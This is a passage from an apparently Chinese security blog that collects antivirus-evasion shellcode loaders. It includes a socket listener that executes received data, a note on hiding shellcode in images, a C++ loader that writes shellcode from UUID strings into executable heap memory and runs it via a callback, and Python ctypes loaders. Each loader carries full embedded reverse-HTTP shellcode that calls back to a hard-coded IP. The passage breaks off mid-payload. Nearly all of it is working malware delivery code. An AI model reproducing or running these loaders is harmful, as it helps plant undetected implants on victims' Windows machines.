function_">zx</span>(<span class="params">data</span>):</span><br><span class="line">    执行code</span><br><span class="line">server = socket.socket()</span><br><span class="line">server.bind((<span class="string">&quot;0.0.0.0&quot;</span>,<span class="number">9999</span>))</span><br><span class="line">server.listen(<span class="number">5</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    conn,addr = server.accept()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data = conn.recv(<span class="number">1024</span>)</span><br><span class="line">        zx(data)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="Python-Images-将shellcode隐写进图片内">Python-Images-将shellcode隐写进图片内</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">参考：https://mp.weixin.qq.com/s/c8U2M_iJ8pWaI50sH8u9Hw</span><br><span class="line">加密:RGBAencodeDataInImage(im, arguments[<span class="string">&#x27;&lt;text&gt;&#x27;</span>]).save(arguments[<span class="string">&#x27;&lt;encodedImage&gt;&#x27;</span>])</span><br><span class="line">解密：im = Image.<span class="built_in">open</span>(arguments[<span class="string">&#x27;&lt;encodedImage&gt;&#x27;</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://mp.weixin.qq.com/s/QZ5YlRZN47zne7vCzvUpJw">https://mp.weixin.qq.com/s/QZ5YlRZN47zne7vCzvUpJw</a></p><h3 id="UUID转换shellcode写入内存免杀">UUID转换shellcode写入内存免杀</h3><p><a href="https://xz.aliyun.com/t/12253">https://xz.aliyun.com/t/12253</a></p><p><a href="https://www.crisprx.top/archives/458">https://www.crisprx.top/archives/458</a></p><p><a href="https://cloud.tencent.com/developer/article/1787219">https://cloud.tencent.com/developer/article/1787219</a></p><h4 id="c-uuid加载器">c++ uuid加载器</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Rpc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;Rpcrt4.lib&quot;</span>)</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* uuids[] = &#123; <span class="string">&quot;0089e8fc-0000-8960-e531-d2648b52308b&quot;</span>,<span class="string">&quot;528b0c52-8b14-2872-0fb7-4a2631ff31c0&quot;</span>,<span class="string">&quot;7c613cac-2c02-c120-cf0d-01c7e2f05257&quot;</span>,<span class="string">&quot;8b10528b-3c42-d001-8b40-7885c0744a01&quot;</span>,<span class="string">&quot;488b50d0-8b18-2058-01d3-e33c498b348b&quot;</span>,<span class="string">&quot;ff31d601-c031-c1ac-cf0d-01c738e075f4&quot;</span>,<span class="string">&quot;3bf87d03-247d-e275-588b-582401d3668b&quot;</span>,<span class="string">&quot;588b4b0c-011c-8bd3-048b-01d089442424&quot;</span>,<span class="string">&quot;59615b5b-515a-e0ff-585f-5a8b12eb865d&quot;</span>,<span class="string">&quot;74656e68-6800-6977-6e69-54684c772607&quot;</span>,<span class="string">&quot;ff31d5ff-5757-5757-5768-3a5679a7ffd5&quot;</span>,<span class="string">&quot;000084e9-5b00-c931-5151-6a0351516850&quot;</span>,<span class="string">&quot;53000000-6850-8957-9fc6-ffd5eb705b31&quot;</span>,<span class="string">&quot;006852d2-4002-5284-5252-53525068eb55&quot;</span>,<span class="string">&quot;d5ff3b2e-c689-c383-5031-ff57576aff53&quot;</span>,<span class="string">&quot;062d6856-7b18-d5ff-85c0-0f84c3010000&quot;</span>,<span class="string">&quot;f685ff31-0474-f989-eb09-68aac5e25dff&quot;</span>,<span class="string">&quot;68c189d5-2145-315e-ffd5-31ff576a0751&quot;</span>,<span class="string">&quot;b7685056-e057-ff0b-d5bf-002f000039c7&quot;</span>,<span class="string">&quot;ff31b774-91e9-0001-00e9-c9010000e88b&quot;</span>,<span class="string">&quot;2fffffff-6b31-566a-00fe-dc7a2d31c9e7&quot;</span>,<span class="string">&quot;42b51e28-625f-f5a3-6442-792da2d8f774&quot;</span>,<span class="string">&quot;c764c1ca-fec2-b232-360a-a0904efad447&quot;</span>,<span class="string">&quot;d98ba404-65e6-8fa1-bee4-b69563f0b446&quot;</span>,<span class="string">&quot;60f88520-b15e-a0f8-59ef-9eb2c6e6f95d&quot;</span>,<span class="string">&quot;5500078e-6573-2d72-4167-656e743a204d&quot;</span>,<span class="string">&quot;6c697a6f-616c-352f-2e30-2028636f6d70&quot;</span>,<span class="string">&quot;62697461-656c-203b-4d53-49452031302e&quot;</span>,<span class="string">&quot;57203b30-6e69-6f64-7773-204e5420362e&quot;</span>,<span class="string">&quot;57203b32-574f-3436-3b20-54726964656e&quot;</span>,<span class="string">&quot;2e362f74-3b30-5420-6f75-63683b204d41&quot;</span>,<span class="string">&quot;534a5053-0d29-000a-91a8-10b7da807fab&quot;</span>,<span class="string">&quot;2f1623c7-614b-ebbd-a514-6f904bdf5a58&quot;</span>,<span class="string">&quot;1f5557e0-6adb-7456-c2a1-9c9f32da910d&quot;</span>,<span class="string">&quot;952d1001-8eef-7249-3a2b-9e598e85a6ad&quot;</span>,<span class="string">&quot;98c69cb6-7d10-1f09-60a3-4aeabe4af549&quot;</span>,<span class="string">&quot;d618c78a-2260-1751-b8d6-61d38a81373e&quot;</span>,<span class="string">&quot;3d1c3d6a-f3c5-57a0-0204-4457c1142371&quot;</span>,<span class="string">&quot;6c8708c2-6b94-c189-d92b-cc6b62253fbb&quot;</span>,<span class="string">&quot;f102569f-4d54-914d-4e89-5bda5ff092a5&quot;</span>,<span class="string">&quot;cfafb2ac-e2bb-b0af-ca5b-08834c927ab5&quot;</span>,<span class="string">&quot;07d2b997-8fc9-80b7-fc26-3da3d19e2942&quot;</span>,<span class="string">&quot;780bcd05-11c2-4f86-6657-dae24b98cc46&quot;</span>,<span class="string">&quot;febde54d-2cc7-d3c4-e5c0-f943cad41d5a&quot;</span>,<span class="string">&quot;6800da73-b5f0-56a2-ffd5-6a4068001000&quot;</span>,<span class="string">&quot;00006800-0040-6857-58a4-53e5ffd593b9&quot;</span>,<span class="string">&quot;00000000-d901-5351-89e7-576800200000&quot;</span>,<span class="string">&quot;12685653-8996-ffe2-d585-c074c68b0701&quot;</span>,<span class="string">&quot;75c085c3-58e5-e8c3-a9fd-ffff31302e31&quot;</span>,<span class="string">&quot;32342e39-312e-3434-0012-345678000000&quot;</span> &#125;; </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  HANDLE hc = <span class="built_in">HeapCreate</span>(HEAP_CREATE_ENABLE_EXECUTE, <span class="number">0</span>, <span class="number">0</span>);<span class="comment">//获得可执行的句柄</span></span><br><span class="line">  <span class="type">void</span>* ha = <span class="built_in">HeapAlloc</span>(hc, <span class="number">0</span>, <span class="number">0x100000</span>);<span class="comment">//申请堆空间</span></span><br><span class="line">  <span class="keyword">if</span> (ha == <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;内存申请失败！&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  DWORD_PTR hptr = (DWORD_PTR)ha;</span><br><span class="line">  <span class="type">int</span> elems = <span class="built_in">sizeof</span>(uuids) / <span class="built_in">sizeof</span>(uuids[<span class="number">0</span>]);<span class="comment">//获得需要写入uuids数组元素个数</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; elems; i++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">//cout &lt;&lt; (RPC_CSTR)uuids[i] &lt;&lt; endl;</span></span><br><span class="line">    <span class="comment">//cout &lt;&lt; (UUID*)hptr &lt;&lt; endl;</span></span><br><span class="line">    RPC_STATUS status = <span class="built_in">UuidFromStringA</span>((RPC_CSTR)uuids[i], (UUID*)hptr);<span class="comment">//写入shellcode</span></span><br><span class="line">      <span class="keyword">if</span> (status != RPC_S_OK)<span class="comment">//判断是否写入正常</span></span><br><span class="line">      &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;UuidFromeStringA()!=S_OK&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="built_in">CloseHandle</span>(ha);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    hptr += <span class="number">16</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//((void(*)())ha)();</span></span><br><span class="line">  <span class="built_in">EnumSystemLocalesA</span>((LOCALE_ENUMPROCA)ha, <span class="number">0</span>);<span class="comment">//回调函数,运行shellcode</span></span><br><span class="line">  <span class="built_in">CloseHandle</span>(ha);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="利用python2脚本将shellcode转换成uuid">利用python2脚本将shellcode转换成uuid</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line">buf=<span class="string">&#x27;\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x60\x11\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x74\x43\x43\x63\x00\x6f\xc7\xb5\xfb\x90\x23\x05\x5e\xfe\xbf\x26\xa1\x46\x4b\x36\x28\xe6\xd1\xab\x1f\xc4\x12\x9a\x19\x5f\x81\x42\x52\xef\x4b\xc3\x7c\xcf\x23\xea\x51\x00\x2e\xb8\xfa\xd5\xc5\xe6\xde\x0f\xe3\x56\x5f\xc9\x36\x70\x95\x75\x17\x6f\x16\x05\x5f\x43\xd2\xcb\x8d\x72\x59\xb3\xe1\x8f\x1a\x3d\x94\xc1\x6a\xa8\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x34\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x38\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x35\x2e\x31\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x34\x2e\x30\x29\x0d\x0a\x00\x84\xfd\x1c\x74\xe3\xda\x9f\x6c\x3b\xf3\x5d\x2e\xfe\x41\x0e\x49\x8c\x4e\x85\x5a\x10\x24\xf9\x19\xb5\xbe\x48\xf3\xfe\xc2\x20\xa8\x49\xdd\xd7\xd8\x35\xd5\x1a\x02\x8d\xaa\xbd\xfa\x56\x1e\x89\x8e\x99\x12\xfc\x51\x96\x2d\xc7\x90\x1f\x3c\xc8\x14\xdb\x9a\x62\xf2\x40\x4f\x7a\x63\x86\x08\x2a\xec\x86\x82\x55\xef\xb8\x18\x88\x69\xe6\x9f\x6d\xce\x1e\x28\x2e\x16\xb2\xa6\x13\x75\xd2\xa7\x4c\xae\x7a\x58\xea\x5c\x74\xb1\xce\x15\x92\xb4\xd9\x75\x6f\x33\xc1\xe6\x71\x08\x60\x27\x39\x6d\x6c\xfe\xf6\x3a\xda\x6d\x66\x72\xc6\x01\x9a\xb5\x40\x4d\xa0\xce\xe8\xa5\x6f\x01\x54\x9c\xe3\x1f\x36\x78\xd8\x71\xc6\x7f\x36\x8f\x06\xf8\xed\xc2\x53\xcc\x78\xe6\x34\xb8\x9c\xe9\xeb\x47\xc7\xaf\x08\xbb\x46\xdc\x00\xdd\x20\x59\xa7\xab\xbc\x68\x1e\xbe\x43\xd5\x37\x39\x09\x25\x27\xb3\xaa\x06\x25\x5d\x51\x12\xf5\xc7\xfc\xb0\xa2\xec\x0d\xa3\x63\xcd\x9f\xc4\x16\x01\x5d\x8d\x5e\x3f\x60\x86\xf1\x15\x7a\x11\x39\xf3\x1b\xae\xa0\x13\xb7\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x34\x33\x2e\x31\x33\x38\x2e\x32\x37\x2e\x31\x32\x00\x49\x96\x02\xd2&#x27;</span></span><br><span class="line">uuid_list = []</span><br><span class="line"><span class="built_in">hex</span> = binascii.hexlify(buf).decode()</span><br><span class="line"></span><br><span class="line"><span class="built_in">hex</span> += <span class="string">&#x27;0&#x27;</span> * (<span class="number">32</span> - (<span class="built_in">len</span>(<span class="built_in">hex</span>) % <span class="number">32</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(<span class="built_in">hex</span>),<span class="number">32</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\&quot;&#123;&#125;\&quot;,&quot;</span>.<span class="built_in">format</span>(uuid.UUID(bytes_le=binascii.unhexlify(<span class="built_in">hex</span>[i:i+<span class="number">32</span>]))))</span><br></pre></td></tr></table></figure><h4 id="python2-uuid加载器">python2 uuid加载器</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x60\x11\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x31\x73\x68\x51\x00\x27\x6b\x08\x03\x3f\x21\xf1\xec\xd6\xc0\x3b\xae\xe3\xab\x55\x82\xf4\x40\xbc\x5b\x9f\xfa\x45\xbd\x37\x51\x3b\xe0\x0d\xa4\x3b\xb2\xd1\xf9\x74\xda\x3a\xd8\x44\xb1\x60\x84\xc5\x83\x10\x70\x5e\x54\x63\xc7\xf8\xf8\x74\x9b\x2b\x6a\x35\x08\xd5\x11\xa9\x32\x98\xec\xd8\x01\xf0\xc4\xae\x4b\x4b\x6c\xba\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x31\x30\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x36\x2e\x30\x3b\x20\x4d\x41\x53\x50\x29\x0d\x0a\x00\x36\x33\x5a\x21\x1c\xe3\x65\x2d\x0e\x19\xa1\xd3\x4c\xf9\x56\xc3\x4e\x54\x7e\x1c\x21\x38\x30\xf3\xf7\x7f\x4a\x21\x52\xb8\x55\x9f\xd0\x0f\x25\x99\x79\x4a\x2b\xcc\xd7\x09\x95\x74\x3b\xee\x1c\xfa\xad\xbd\xec\x84\x00\xdb\xd8\x58\x89\xb8\xad\xd3\x86\x5b\xd3\x09\xc2\xcd\xb6\xfd\x9e\x9f\xb2\x26\xc8\xaa\xfc\x0e\xc9\xf8\xa2\xfd\x5c\x99\x91\xb7\x08\x11\xd8\x91\xde\xfe\x43\x95\x1c\x96\x29\x08\x55\x39\x21\x7d\x8c\xd5\xac\x46\x6e\x78\x65\x16\xb9\xf1\x53\xc6\x25\x76\x78\xd7\xfd\xdd\xb0\x7f\x40\xea\x7f\x68\xba\x6e\x5d\x99\x55\x5f\x11\xd9\x05\x90\x92\x2c\x9e\xb3\x75\x5e\x73\x72\x81\x4d\xe0\x00\xa6\x38\x0b\xed\xe5\x4e\xcb\x8d\xd1\x44\x12\xb3\xf8\xd0\x3a\xcc\xd6\x06\xf1\x36\x4f\x8e\x66\x39\x66\x42\xe3\xc7\x74\xa5\xbd\xac\x0d\xe6\xe5\xd3\x53\x0c\x8e\x90\xca\xd3\x01\x0d\x88\x7c\x91\x63\xdb\xe2\xd9\xb3\x4d\x9f\x57\x3b\x64\x31\x8a\x66\xea\x78\xeb\x07\x09\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x34\x33\x2e\x31\x33\x38\x2e\x32\x37\x2e\x31\x32\x00\x49\x96\x02\xd2&quot;</span></span><br><span class="line"><span class="built_in">list</span> = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    bytes_a = shellcode[i * <span class="number">16</span>: <span class="number">16</span> + i * <span class="number">16</span>]</span><br><span class="line">    b = uuid.UUID(bytes_le=bytes_a)</span><br><span class="line">    <span class="built_in">list</span>.append(<span class="built_in">str</span>(b))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line"></span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>), ctypes.c_int(<span class="built_in">len</span>(uuid_list)*<span class="number">16</span>), ctypes.c_int(<span class="number">0x3000</span>), ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line"></span><br><span class="line">ptr1 = ptr</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> uuid_list:</span><br><span class="line">    ctypes.windll.Rpcrt4.UuidFromStringA(j, ptr1)</span><br><span class="line">    ptr1 += <span class="number">16</span></span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(<span class="number">0</span>, <span class="number">0</span>, ptr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(handle, -<span class="number">1</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">shellcode=<span class="string">b&quot;\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x60\x11\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x31\x73\x68\x51\x00\x27\x6b\x08\x03\x3f\x21\xf1\xec\xd6\xc0\x3b\xae\xe3\x